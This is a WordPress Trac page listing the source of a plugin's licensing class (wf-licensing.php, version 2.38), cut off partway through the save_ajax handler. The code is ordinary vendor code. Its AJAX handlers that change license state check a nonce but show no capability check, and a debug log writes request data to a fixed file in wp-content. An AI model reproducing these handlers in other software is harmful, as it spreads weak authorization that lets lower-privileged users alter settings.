=== Content from plugins.trac.wordpress.org_3f9fa8fd_20250111_113433.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fminimal-coming-soon-maintenance-mode%2Ftags%2F2.38%2Fframework%2Fwf-licensing.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=2543111 "Revision 2543111")
* [Next Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123 "Revision 3099123") →
* [Blame](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

---

# [source:](/browser?order=name "Go to repository root") [minimal-coming-soon-maintenance-mode](/browser/minimal-coming-soon-maintenance-mode?order=name "View minimal-coming-soon-maintenance-mode")/[tags](/browser/minimal-coming-soon-maintenance-mode/tags?order=name "View tags")/[2.38](/browser/minimal-coming-soon-maintenance-mode/tags/2.38?order=name "View 2.38")/[framework](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework?order=name "View framework")/[wf-licensing.php](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?order=name "View wf-licensing.php")

View diff against:

View revision:

| [Last change](/changeset/3031149/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php "View differences") on this file was [3031149](/changeset/3031149/ "View changeset 3031149"), checked in by WebFactory, [11 months ago](/timeline?from=2024-02-04T14%3A33%3A27Z&precision=second "See timeline at 02/04/2024 02:33:27 PM") |
| --- |
| Bug fixes |
| **File size:** 20.8 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | if (false === class\_exists('WF\_Licensing\_CSMM')) { |
| [3](#L3) | class WF\_Licensing\_CSMM |
| [4](#L4) | { |
| [5](#L5) | public $prefix = ''; |
| [6](#L6) | private $licensing\_servers = array(); |
| [7](#L7) | private $version = ''; |
| [8](#L8) | private $slug = ''; |
| [9](#L9) | private $basename = ''; |
| [10](#L10) | private $plugin\_page = ''; |
| [11](#L11) | private $plugin\_file = ''; |
| [12](#L12) | private $js\_folder = ''; |
| [13](#L13) | protected $api\_ver = 'v1/'; |
| [14](#L14) | protected $valid\_forever = '2035-01-01'; |
| [15](#L15) | protected $unlimited\_installs = 99999; |
| [16](#L16) | public $disable\_remote = true; |
| [17](#L17) | public $debug = false; |
| [18](#L18) |  |
| [19](#L19) |  |
| [20](#L20) | /\*\* |
| [21](#L21) | \* Init licensing by setting up various params and hooking into actions. |
| [22](#L22) | \* |
| [23](#L23) | \* @param array $params Prefix, licensing\_servers, version, plugin\_file, skip\_hooks |
| [24](#L24) | \* |
| [25](#L25) | \* @return void |
| [26](#L26) | \*/ |
| [27](#L27) | function \_\_construct($params) |
| [28](#L28) | { |
| [29](#L29) | $this->prefix = trim($params['prefix']); |
| [30](#L30) | $this->licensing\_servers = $params['licensing\_servers']; |
| [31](#L31) | $this->version = trim($params['version']); |
| [32](#L32) | $this->slug = dirname(plugin\_basename(trim($params['plugin\_file']))); |
| [33](#L33) | $this->basename = plugin\_basename(trim($params['plugin\_file'])); |
| [34](#L34) | $this->plugin\_file = $params['plugin\_file']; |
| [35](#L35) | $this->plugin\_page = trim($params['plugin\_page']); |
| [36](#L36) | $this->disable\_remote = !empty($params['disable\_remote']); |
| [37](#L37) | $this->debug = !empty($params['debug']); |
| [38](#L38) |  |
| [39](#L39) | if ($params['js\_folder']) { |
| [40](#L40) | $this->js\_folder = trim($params['js\_folder']); |
| [41](#L41) | } else { |
| [42](#L42) | $this->js\_folder = plugin\_dir\_url($this->plugin\_file) . 'js/'; |
| [43](#L43) | } |
| [44](#L44) |  |
| [45](#L45) | if (empty($params['skip\_hooks'])) { |
| [46](#L46) | register\_activation\_hook($this->plugin\_file, array($this, 'activate\_plugin')); |
| [47](#L47) | register\_deactivation\_hook($this->plugin\_file, array($this, 'deactivate\_plugin')); |
| [48](#L48) |  |
| [49](#L49) | add\_action('init', array($this, 'init')); |
| [50](#L50) |  |
| [51](#L51) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_validate', array($this, 'validate\_ajax')); |
| [52](#L52) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_save', array($this, 'save\_ajax')); |
| [53](#L53) |  |
| [54](#L54) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_deactivate', array($this, 'deactivate\_ajax')); |
| [55](#L55) | } |
| [56](#L56) |  |
| [57](#L57) | $this->log('\_\_construct', $params, get\_object\_vars($this)); |
| [58](#L58) |  |
| [59](#L59) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_refresh', array($this, 'remote\_action\_refresh')); |
| [60](#L60) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_deactivate\_license', array($this, 'remote\_action\_deactivate\_license')); |
| [61](#L61) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_validate\_license', array($this, 'remote\_action\_validate\_license')); |
| [62](#L62) |  |
| [63](#L63) | add\_action('plugins\_loaded', array($this, 'monitor\_remote\_actions')); |
| [64](#L64) | } // \_\_construct |
| [65](#L65) |  |
| [66](#L66) |  |
| [67](#L67) | /\*\* |
| [68](#L68) | \* Actions performed on WP init action. |
| [69](#L69) | \* |
| [70](#L70) | \* @return void |
| [71](#L71) | \*/ |
| [72](#L72) | function init() |
| [73](#L73) | { |
| [74](#L74) | if (is\_admin()) { |
| [75](#L75) | add\_action('admin\_enqueue\_scripts', array($this, 'admin\_enqueue\_scripts')); |
| [76](#L76) | } |
| [77](#L77) | } // init |
| [78](#L78) |  |
| [79](#L79) |  |
| [80](#L80) | function admin\_enqueue\_scripts() { |
| [81](#L81) | $current\_screen = get\_current\_screen(); |
| [82](#L82) |  |
| [83](#L83) | if (empty($current\_screen->id) || $current\_screen->id != $this->plugin\_page) { |
| [84](#L84) | return false; |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | $vars = array( |
| [88](#L88) | 'prefix' => $this->prefix, |
| [89](#L89) | 'debug' => $this->debug, |
| [90](#L90) | 'nonce' => wp\_create\_nonce('wf\_licensing\_' . $this->prefix), |
| [91](#L91) | 'licensing\_endpoint' => $this->licensing\_servers[0] . $this->api\_ver, |
| [92](#L92) | 'request\_data' => array( |
| [93](#L93) | 'action' => 'validate\_license', |
| [94](#L94) | 'license\_key' => '', |
| [95](#L95) | 'rand' => rand(1000, 9999), |
| [96](#L96) | 'version' => $this->version, |
| [97](#L97) | 'wp\_version' => get\_bloginfo('version'), |
| [98](#L98) | 'site\_url' => get\_home\_url(), |
| [99](#L99) | 'site\_title' => get\_bloginfo('name'), |
| [100](#L100) | 'meta' => array() |
| [101](#L101) | ) |
| [102](#L102) | ); |
| [103](#L103) |  |
| [104](#L104) | wp\_enqueue\_script('wf\_licensing', $this->js\_folder . 'wf-licensing.js', array(), 1.0, true); |
| [105](#L105) | wp\_localize\_script('wf\_licensing', 'wf\_licensing\_' . $this->prefix, $vars); |
| [106](#L106) | } // admin\_enqueue\_scripts |
| [107](#L107) |  |
| [108](#L108) |  |
| [109](#L109) | function monitor\_remote\_actions() |
| [110](#L110) | { |
| [111](#L111) | if ($this->disable\_remote || is\_admin()) { |
| [112](#L112) | return; |
| [113](#L113) | } |
| [114](#L114) |  |
| [115](#L115) | if (!empty($\_REQUEST[$this->prefix . '\_access\_key']) && !empty($\_REQUEST[$this->prefix . '\_action']) && isset($\_REQUEST[$this->prefix . '\_action\_params'])) { |
| [116](#L116) | $access\_key = substr(trim($\_REQUEST[$this->prefix . '\_access\_key']), 0, 32); |
| [117](#L117) | $action = substr(trim($\_REQUEST[$this->prefix . '\_action']), 0, 32); |
| [118](#L118) | $action\_params = $\_REQUEST[$this->prefix . '\_action\_params']; |
| [119](#L119) | $rand = substr($\_REQUEST[$this->prefix . '\_rand'], 0, 5); |
| [120](#L120) | $rand = preg\_replace("/[^0-9]/", '', $rand); |
| [121](#L121) |  |
| [122](#L122) | nocache\_headers(); |
| [123](#L123) | header('X-WF-Licensing-' . $this->prefix . ': ' . $this->version); |
| [124](#L124) |  |
| [125](#L125) | if (strlen($rand) != 5) { |
| [126](#L126) | wp\_send\_json\_error('Invalid random value.'); |
| [127](#L127) | } |
| [128](#L128) |  |
| [129](#L129) | if (false == $this->is\_active(false, false, true)) { |
| [130](#L130) | wp\_send\_json\_error('License is not active.'); |
| [131](#L131) | } |
| [132](#L132) |  |
| [133](#L133) | if (false == $this->is\_remote\_action($action)) { |
| [134](#L134) | wp\_send\_json\_error('Unknown remote action.'); |
| [135](#L135) | } |
| [136](#L136) |  |
| [137](#L137) | $access\_key = preg\_replace("/[^0-9a-zA-Z]/", '', $access\_key); |
| [138](#L138) | if (strlen($access\_key) != 32) { |
| [139](#L139) | wp\_send\_json\_error('Invalid access key format.'); |
| [140](#L140) | } |
| [141](#L141) |  |
| [142](#L142) | $license = $this->get\_license(); |
| [143](#L143) | if ($access\_key != $license['access\_key']) { |
| [144](#L144) | wp\_send\_json\_error('Invalid access key.'); |
| [145](#L145) | } |
| [146](#L146) |  |
| [147](#L147) | $post\_data = @json\_decode(file\_get\_contents('php://input'), true); |
| [148](#L148) | do\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_' . $action, $action\_params, $this, $post\_data); |
| [149](#L149) |  |
| [150](#L150) | wp\_send\_json\_error('Remote action did not execute.'); |
| [151](#L151) | die(); |
| [152](#L152) | } |
| [153](#L153) | } // monitor\_remote\_actions |
| [154](#L154) |  |
| [155](#L155) |  |
| [156](#L156) | function remote\_action\_refresh($action\_params) |
| [157](#L157) | { |
| [158](#L158) | $data = $this->prepare\_server\_query\_data('remote\_refresh'); |
| [159](#L159) |  |
| [160](#L160) | wp\_send\_json\_success($data); |
| [161](#L161) | } // remote\_action\_refresh |
| [162](#L162) |  |
| [163](#L163) |  |
| [164](#L164) | function remote\_action\_validate\_license($action\_params) |
| [165](#L165) | { |
| [166](#L166) | $validate = $this->validate(); |
| [167](#L167) | $license = $this->get\_license(); |
| [168](#L168) |  |
| [169](#L169) | wp\_send\_json\_success(array('validate' => $validate, 'license' => $license)); |
| [170](#L170) | } // remote\_action\_validate\_license |
| [171](#L171) |  |
| [172](#L172) |  |
| [173](#L173) | function remote\_action\_deactivate\_license($action\_params) |
| [174](#L174) | { |
| [175](#L175) | $license = $this->get\_license(); |
| [176](#L176) | $this->update\_license(false); |
| [177](#L177) |  |
| [178](#L178) | if ($action\_params['keep\_license\_key']) { |
| [179](#L179) | $tmp = array('error' => 'License is no longer valid for this site.', 'license\_key' => $license['license\_key']); |
| [180](#L180) | $this->update\_license($tmp); |
| [181](#L181) | } |
| [182](#L182) |  |
| [183](#L183) | wp\_send\_json\_success(); |
| [184](#L184) | } // remote\_action\_deactivate\_license |
| [185](#L185) |  |
| [186](#L186) |  |
| [187](#L187) | private function is\_remote\_action($action) |
| [188](#L188) | { |
| [189](#L189) | $actions = array('refresh', 'validate\_license', 'deactivate\_license'); |
| [190](#L190) | $actions = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_actions', $actions); |
| [191](#L191) |  |
| [192](#L192) | if (in\_array($action, $actions)) { |
| [193](#L193) | return true; |
| [194](#L194) | } else { |
| [195](#L195) | return false; |
| [196](#L196) | } |
| [197](#L197) | } // is\_remote\_action |
| [198](#L198) |  |
| [199](#L199) |  |
| [200](#L200) | /\*\* |
| [201](#L201) | \* Log message if debugging is enabled. |
| [202](#L202) | \* Log file: /wp-content/wf-licensing.log |
| [203](#L203) | \* |
| [204](#L204) | \* @param string $message Message to write to log. |
| [205](#L205) | \* @param mixed $data Optional, extra data to write to debug log. |
| [206](#L206) | \* |
| [207](#L207) | \* @return void |
| [208](#L208) | \*/ |
| [209](#L209) | function log($message, ...$data) |
| [210](#L210) | { |
| [211](#L211) | if (!$this->debug) { |
| [212](#L212) | return; |
| [213](#L213) | } |
| [214](#L214) |  |
| [215](#L215) | $log\_file = trailingslashit(WP\_CONTENT\_DIR) . 'wf-licensing.log'; |
| [216](#L216) | $fp = fopen($log\_file, 'a+'); |
| [217](#L217) |  |
| [218](#L218) | fputs($fp, '[' . date('r') . '] ' . $this->prefix . ': '); |
| [219](#L219) | fputs($fp, (string) $message . PHP\_EOL); |
| [220](#L220) | foreach ($data as $tmp) { |
| [221](#L221) | fputs($fp, print\_r($tmp, true)); |
| [222](#L222) | } |
| [223](#L223) |  |
| [224](#L224) | fputs($fp, PHP\_EOL); |
| [225](#L225) | fclose($fp); |
| [226](#L226) | } // log |
| [227](#L227) |  |
| [228](#L228) |  |
| [229](#L229) | /\*\* |
| [230](#L230) | \* Fetches license details from the database. |
| [231](#L231) | \* |
| [232](#L232) | \* @param string $key If set returns only requested options key. |
| [233](#L233) | \* |
| [234](#L234) | \* @return string |
| [235](#L235) | \*/ |
| [236](#L236) | function get\_license($key = '') |
| [237](#L237) | { |
| [238](#L238) | $default = array( |
| [239](#L239) | 'license\_key' => '', |
| [240](#L240) | 'error' => '', |
| [241](#L241) | 'valid\_until' => '', |
| [242](#L242) | 'last\_check' => 0, |
| [243](#L243) | 'name' => '', |
| [244](#L244) | 'access\_key' => '', |
| [245](#L245) | 'meta' => array() |
| [246](#L246) | ); |
| [247](#L247) |  |
| [248](#L248) | $options = get\_option('wf\_licensing\_' . $this->prefix, array()); |
| [249](#L249) | $options = array\_merge($default, $options); |
| [250](#L250) |  |
| [251](#L251) | if (empty($options['access\_key'])) { |
| [252](#L252) | $options['access\_key'] = $this->generate\_access\_key(); |
| [253](#L253) | $this->update\_license($options); |
| [254](#L254) | } |
| [255](#L255) |  |
| [256](#L256) | if (!empty($key)) { |
| [257](#L257) | return $options[$key]; |
| [258](#L258) | } else { |
| [259](#L259) | return $options; |
| [260](#L260) | } |
| [261](#L261) | } // get\_license |
| [262](#L262) |  |
| [263](#L263) |  |
| [264](#L264) | function generate\_access\_key() |
| [265](#L265) | { |
| [266](#L266) | $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; |
| [267](#L267) | $pieces = array(); |
| [268](#L268) | $max = strlen($keyspace) - 1; |
| [269](#L269) |  |
| [270](#L270) | for ($i = 0; $i < 32; ++$i) { |
| [271](#L271) | $pieces[] = $keyspace[random\_int(0, $max)]; |
| [272](#L272) | } |
| [273](#L273) | return implode('', $pieces); |
| [274](#L274) | } // generate\_access\_key |
| [275](#L275) |  |
| [276](#L276) |  |
| [277](#L277) | function get\_license\_formatted($key = '') |
| [278](#L278) | { |
| [279](#L279) | $license = $this->get\_license(); |
| [280](#L280) | $out = array( |
| [281](#L281) | 'name' => '', |
| [282](#L282) | 'name\_long' => '', |
| [283](#L283) | 'valid\_until' => '', |
| [284](#L284) | 'expires' => '', |
| [285](#L285) | 'license\_key' => '', |
| [286](#L286) | 'license\_key\_hidden' => '', |
| [287](#L287) | 'recurring' => false, |
| [288](#L288) | 'keyless' => false, |
| [289](#L289) | ); |
| [290](#L290) |  |
| [291](#L291) | if (!$this->is\_active()) { |
| [292](#L292) | return $out; |
| [293](#L293) | } |
| [294](#L294) | $license['valid\_until'] = $license['valid\_until']; |
| [295](#L295) |  |
| [296](#L296) | $out['name'] = $license['name']; |
| [297](#L297) | $out['name\_long'] = $license['name']; |
| [298](#L298) | if ($license['meta']) { |
| [299](#L299) | $tmp = ''; |
| [300](#L300) | foreach ($license['meta'] as $meta => $meta\_value) { |
| [301](#L301) |  |
| [302](#L302) | if ($meta[0] == '\_' || filter\_var($meta\_value, FILTER\_VALIDATE\_BOOLEAN) != true) { |
| [303](#L303) | continue; |
| [304](#L304) | } |
| [305](#L305) | $meta = str\_replace('\_', ' ', $meta); |
| [306](#L306) | $meta = ucwords($meta); |
| [307](#L307) | $tmp .= $meta . ', '; |
| [308](#L308) | } |
| [309](#L309) | $tmp = trim($tmp, ', '); |
| [310](#L310) | if ($tmp) { |
| [311](#L311) | $out['name\_long'] .= ' with ' . $tmp; |
| [312](#L312) | } |
| [313](#L313) | } |
| [314](#L314) |  |
| [315](#L315) | if ($license['valid\_until'] == $this->valid\_forever) { |
| [316](#L316) | $out['valid\_until'] = 'forever'; |
| [317](#L317) | $out['recurring'] = false; |
| [318](#L318) | } else { |
| [319](#L319) | $out['valid\_until'] = 'until ' . date(get\_option('date\_format'), strtotime($license['valid\_until'])); |
| [320](#L320) | $out['recurring'] = true; |
| [321](#L321) | } |
| [322](#L322) |  |
| [323](#L323) | if (date('Y-m-d') == $license['valid\_until']) { |
| [324](#L324) | $out['expires'] = 'today'; |
| [325](#L325) | } elseif (date('Y-m-d', time() + 30 \* DAY\_IN\_SECONDS) > $license['valid\_until']) { |
| [326](#L326) | $tmp = (strtotime($license['valid\_until'] . date(' G:i:s')) - time()) / DAY\_IN\_SECONDS; |
| [327](#L327) | $out['expires'] = 'in ' . round($tmp) . ' days'; |
| [328](#L328) | } else { |
| [329](#L329) | $out['expires'] = 'in more than 30 days'; |
| [330](#L330) | } |
| [331](#L331) |  |
| [332](#L332) | if (empty($license['license\_key']) || $license['license\_key'] == 'keyless') { |
| [333](#L333) | $out['keyless'] = true; |
| [334](#L334) | } else { |
| [335](#L335) | $out['keyless'] = false; |
| [336](#L336) | $out['license\_key'] = $license['license\_key']; |
| [337](#L337) | $tmp = strlen($license['license\_key']); |
| [338](#L338) | $dash = false; |
| [339](#L339) | $new = ''; |
| [340](#L340) | for ($i = $tmp - 1; $i >= 0; $i--) { |
| [341](#L341) | if ($dash == false || $out['license\_key'][$i] == '-') { |
| [342](#L342) | $new = $out['license\_key'][$i] . $new; |
| [343](#L343) | } else { |
| [344](#L344) | $new = '\*' . $new; |
| [345](#L345) | } |
| [346](#L346) | if ($out['license\_key'][$i] == '-') { |
| [347](#L347) | $dash = true; |
| [348](#L348) | } |
| [349](#L349) | } |
| [350](#L350) | $out['license\_key\_hidden'] = $new; |
| [351](#L351) | } |
| [352](#L352) |  |
| [353](#L353) | $out = apply\_filters('wf\_licensing\_license\_formatted\_' . $this->prefix, $out); |
| [354](#L354) |  |
| [355](#L355) | if (!empty($key)) { |
| [356](#L356) | return $out[$key]; |
| [357](#L357) | } else { |
| [358](#L358) | return $out; |
| [359](#L359) | } |
| [360](#L360) | } // get\_license\_formatted |
| [361](#L361) |  |
| [362](#L362) |  |
| [363](#L363) | /\*\* |
| [364](#L364) | \* Updates license details in the database. |
| [365](#L365) | \* |
| [366](#L366) | \* @param string $data License data to save; or empty to delete license |
| [367](#L367) | \* |
| [368](#L368) | \* @return bool |
| [369](#L369) | \*/ |
| [370](#L370) | function update\_license($data = false) |
| [371](#L371) | { |
| [372](#L372) | if (false === $data) { |
| [373](#L373) | $tmp = delete\_option('wf\_licensing\_' . $this->prefix); |
| [374](#L374) | } else { |
| [375](#L375) | if (!isset($data['access\_key'])) { |
| [376](#L376) | $data['access\_key'] = $this->get\_license('access\_key'); |
| [377](#L377) | } |
| [378](#L378) | $tmp = update\_option('wf\_licensing\_' . $this->prefix, $data); |
| [379](#L379) | } |
| [380](#L380) |  |
| [381](#L381) | return $tmp; |
| [382](#L382) | } // update\_license |
| [383](#L383) |  |
| [384](#L384) |  |
| [385](#L385) | /\*\* |
| [386](#L386) | \* Check if license is valid |
| [387](#L387) | \* |
| [388](#L388) | \* @param string $feature If set it checks for a specific feature. |
| [389](#L389) | \* @param bool $force\_check Forces license recheck on server instead of just cached values. |
| [390](#L390) | \* |
| [391](#L391) | \* @return boolean |
| [392](#L392) | \*/ |
| [393](#L393) | function is\_active($feature = '', $force\_check = false, $local\_only = false) |
| [394](#L394) | { |
| [395](#L395) | $last\_check = $this->get\_license('last\_check'); |
| [396](#L396) | if ($local\_only == false) { |
| [397](#L397) | if ($force\_check || ($last\_check && ($last\_check + HOUR\_IN\_SECONDS \* 8) < time())) { |
| [398](#L398) | $this->log('auto recheck license'); |
| [399](#L399) | $this->validate(); |
| [400](#L400) | } |
| [401](#L401) | } |
| [402](#L402) |  |
| [403](#L403) | $license = $this->get\_license(); |
| [404](#L404) |  |
| [405](#L405) | if ( |
| [406](#L406) | !empty($license['license\_key']) && !empty($license['name']) && |
| [407](#L407) | !empty($license['valid\_until']) && $license['valid\_until'] >= date('Y-m-d') |
| [408](#L408) | ) { |
| [409](#L409) | if (!empty($feature)) { |
| [410](#L410) | if (!empty($license['meta'][$feature]) && filter\_var($license['meta'][$feature], FILTER\_VALIDATE\_BOOLEAN) == true) { |
| [411](#L411) | return true; |
| [412](#L412) | } else { |
| [413](#L413) | return false; |
| [414](#L414) | } |
| [415](#L415) | } else { |
| [416](#L416) | return true; |
| [417](#L417) | } |
| [418](#L418) | } else { |
| [419](#L419) | return false; |
| [420](#L420) | } |
| [421](#L421) | } // is\_active |
| [422](#L422) |  |
| [423](#L423) |  |
| [424](#L424) | /\*\* |
| [425](#L425) | \* Hook to plugin activation action. |
| [426](#L426) | \* If there's a license key, try to activate & write response. |
| [427](#L427) | \* |
| [428](#L428) | \* @return void |
| [429](#L429) | \*/ |
| [430](#L430) | function activate\_plugin() |
| [431](#L431) | { |
| [432](#L432) | $license = $this->get\_license(); |
| [433](#L433) | if ($this->is\_active() || !$license['license\_key']) { |
| [434](#L434) | return false; |
| [435](#L435) | } |
| [436](#L436) |  |
| [437](#L437) | $tmp = $this->validate(); |
| [438](#L438) | if ($tmp) { |
| [439](#L439) | $this->log('activating plugin, license activated'); |
| [440](#L440) | return true; |
| [441](#L441) | } else { |
| [442](#L442) | $this->log('activating plugin, unable to activate license'); |
| [443](#L443) | return false; |
| [444](#L444) | } |
| [445](#L445) | } // activate\_plugin |
| [446](#L446) |  |
| [447](#L447) |  |
| [448](#L448) | /\*\* |
| [449](#L449) | \* Hook to plugin deactivation action. |
| [450](#L450) | \* If there's a license key, try to deactivate & write response. |
| [451](#L451) | \* |
| [452](#L452) | \* @return void |
| [453](#L453) | \*/ |
| [454](#L454) | function deactivate\_plugin() |
| [455](#L455) | { |
| [456](#L456) | if (!$this->is\_active()) { |
| [457](#L457) | return false; |
| [458](#L458) | } |
| [459](#L459) |  |
| [460](#L460) | $license = $this->get\_license(); |
| [461](#L461) | $result = $this->query\_licensing\_server('deactivate\_license'); |
| [462](#L462) |  |
| [463](#L463) | if (is\_wp\_error($result) || !is\_array($result) || !isset($result['success']) || $result['success'] == false) { |
| [464](#L464) | $this->log('unable to deactivate license'); |
| [465](#L465) |  |
| [466](#L466) | return false; |
| [467](#L467) | } else { |
| [468](#L468) | $license['error'] = ''; |
| [469](#L469) | $license['name'] = ''; |
| [470](#L470) | $license['valid\_until'] = ''; |
| [471](#L471) | $license['meta'] = ''; |
| [472](#L472) | $license['last\_check'] = 0; |
| [473](#L473) | $this->update\_license($license); |
| [474](#L474) | $this->log('license deactivated'); |
| [475](#L475) |  |
| [476](#L476) | return true; |
| [477](#L477) | } |
| [478](#L478) | } // deactivate\_plugin |
| [479](#L479) |  |
| [480](#L480) |  |
| [481](#L481) | /\*\* |
| [482](#L482) | \* Use when uninstalling (deleting) the plugin to clean up. |
| [483](#L483) | \* |
| [484](#L484) | \* @param string $prefix Same prefix as used when initialising the class. |
| [485](#L485) | \* @return bool |
| [486](#L486) | \*/ |
| [487](#L487) | static function uninstall\_plugin($prefix) |
| [488](#L488) | { |
| [489](#L489) | $tmp = delete\_option('wf\_licensing\_' . $prefix); |
| [490](#L490) |  |
| [491](#L491) | return $tmp; |
| [492](#L492) | } // uninstall\_plugin |
| [493](#L493) |  |
| [494](#L494) |  |
| [495](#L495) | /\*\* |
| [496](#L496) | \* Delete license locally and send deactivate ping to licensing server |
| [497](#L497) | \* |
| [498](#L498) | \* @return void |
| [499](#L499) | \*/ |
| [500](#L500) | function deactivate() { |
| [501](#L501) | $license = $this->get\_license(); |
| [502](#L502) | $result = $this->query\_licensing\_server('deactivate\_license', array()); |
| [503](#L503) | $this->update\_license(false); |
| [504](#L504) |  |
| [505](#L505) | return $result; |
| [506](#L506) | } // deactivate |
| [507](#L507) |  |
| [508](#L508) | /\*\* |
| [509](#L509) | \* Validate license key on server and save response. |
| [510](#L510) | \* |
| [511](#L511) | \* @param string $license\_key License key, or leave empty to pull from saved. |
| [512](#L512) | \* |
| [513](#L513) | \* @return void |
| [514](#L514) | \*/ |
| [515](#L515) | function validate($license\_key = '') |
| [516](#L516) | { |
| [517](#L517) | $license = $this->get\_license(); |
| [518](#L518) | if (empty($license\_key)) { |
| [519](#L519) | $license\_key = $license['license\_key']; |
| [520](#L520) | } |
| [521](#L521) |  |
| [522](#L522) | $out = array( |
| [523](#L523) | 'license\_key' => $license\_key, |
| [524](#L524) | 'error' => '', |
| [525](#L525) | 'name' => '', |
| [526](#L526) | 'last\_check' => 0, |
| [527](#L527) | 'valid\_until' => '', |
| [528](#L528) | 'meta' => array() |
| [529](#L529) | ); |
| [530](#L530) |  |
| [531](#L531) | $result = $this->query\_licensing\_server('validate\_license', array('license\_key' => $license\_key)); |
| [532](#L532) |  |
| [533](#L533) | if (is\_wp\_error($result)) { |
| [534](#L534) | $out['error'] = 'Error querying licensing server. ' .  $result->get\_error\_message() . ' Please try again in a few moments.'; |
| [535](#L535) | $this->update\_license($out); |
| [536](#L536) |  |
| [537](#L537) | return false; |
| [538](#L538) | } elseif (!is\_array($result) || !isset($result['success'])) { |
| [539](#L539) | $out['error'] = 'Invalid response from licensing server. Please try again in a few moments.'; |
| [540](#L540) | $this->update\_license($out); |
| [541](#L541) |  |
| [542](#L542) | return false; |
| [543](#L543) | } elseif ($result['success'] == false) { |
| [544](#L544) | $out['error'] = $result['data']; |
| [545](#L545) | $this->update\_license($out); |
| [546](#L546) |  |
| [547](#L547) | return true; |
| [548](#L548) | } else { |
| [549](#L549) | $out['error'] = $result['data']['error']; |
| [550](#L550) | $out['name'] = $result['data']['name']; |
| [551](#L551) | $out['valid\_until'] = $result['data']['valid\_until']; |
| [552](#L552) | $out['meta'] = $result['data']['meta']; |
| [553](#L553) | $out['last\_check'] = time(); |
| [554](#L554) | $this->update\_license($out); |
| [555](#L555) |  |
| [556](#L556) | return true; |
| [557](#L557) | } |
| [558](#L558) | } // validate |
| [559](#L559) |  |
| [560](#L560) |  |
| [561](#L561) | function validate\_ajax() |
| [562](#L562) | { |
| [563](#L563) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [564](#L564) |  |
| [565](#L565) | $license\_key = trim($\_REQUEST['license\_key']); |
| [566](#L566) | if (empty($license\_key)) { |
| [567](#L567) | $this->update\_license(false); |
| [568](#L568) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, false); |
| [569](#L569) |  |
| [570](#L570) | wp\_send\_json\_success(); |
| [571](#L571) | } else { |
| [572](#L572) | $result = $this->validate($license\_key); |
| [573](#L573) | $license = $this->get\_license(); |
| [574](#L574) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, $result); |
| [575](#L575) |  |
| [576](#L576) | if ($result == true) { |
| [577](#L577) | wp\_send\_json\_success($result); |
| [578](#L578) | } else { |
| [579](#L579) | wp\_send\_json\_error($license); |
| [580](#L580) | } |
| [581](#L581) | } |
| [582](#L582) | } // validate\_ajax |
| [583](#L583) |  |
| [584](#L584) |  |
| [585](#L585) | function deactivate\_ajax() |
| [586](#L586) | { |
| [587](#L587) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [588](#L588) |  |
| [589](#L589) | $old\_license = $this->get\_license(); |
| [590](#L590) | $result = $this->deactivate(); |
| [591](#L591) | do\_action('wf\_licensing\_' . $this->prefix . 'deactivate\_ajax', $old\_license, $result); |
| [592](#L592) | wp\_send\_json\_success($result); |
| [593](#L593) | } // deactivate\_ajax |
| [594](#L594) |  |
| [595](#L595) |  |
| [596](#L596) | function save\_ajax() |
| [597](#L597) | { |
| [598](#L598) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [599](#L599) |  |
